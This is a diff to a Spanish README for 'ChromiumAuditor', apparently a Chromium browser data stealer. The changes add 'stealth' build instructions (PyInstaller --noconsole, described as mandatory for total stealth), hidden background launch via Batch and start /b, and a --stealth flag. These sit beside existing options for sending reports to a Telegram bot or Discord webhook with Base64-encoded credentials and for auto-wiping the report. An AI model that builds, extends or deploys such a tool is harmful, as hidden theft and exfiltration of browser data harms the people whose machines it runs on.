@@ -91,11 +91,13 @@ Puedes pre-configurar el script editando la sección `CREDENCIALES HARDCODED` en
 ## 📦 Compilación Profesional (.exe)
 
 ```bash
-# Compilación a un solo archivo (.exe) portable
+# Compilación sigilosa: sin ventana de consola, un solo archivo portable
 pyinstaller --onefile --noconsole --name "ChromiumAuditor" main.py
 ```
 
----
+> [!NOTE]
+> `--noconsole` es **obligatorio** para sigilo total. Sin él aparece una ventana negra de terminal al ejecutarse.
+> Compatible con llamadas desde **Batch** (`call ChromiumAuditor.exe`) y ejecución en background (`start /b ChromiumAuditor.exe`).
 
 ## 🚦 Panel de Argumentos CLI
 
@@ -106,6 +108,7 @@ pyinstaller --onefile --noconsole --name "ChromiumAuditor" main.py
 | **`-t`** | `--telegram-token` | Token del bot de Telegram (Plano o B64). |
 | **`-c`** | `--telegram-chatid` | ID del chat de Telegram (Plano o B64). |
 | **`-d`** | `--discord` | URL del Webhook de Discord (Plano o B64). |
+| 🕵️ | `-s` / `--stealth` | Oculta la consola en tiempo real (idéntico a `.exe --noconsole`). |
 | 🧹 | `--no-wipe` | Evita auto-borrado del reporte. |
 | 🛠️ | `-v` | Modo verboso (logs detallados). |
 
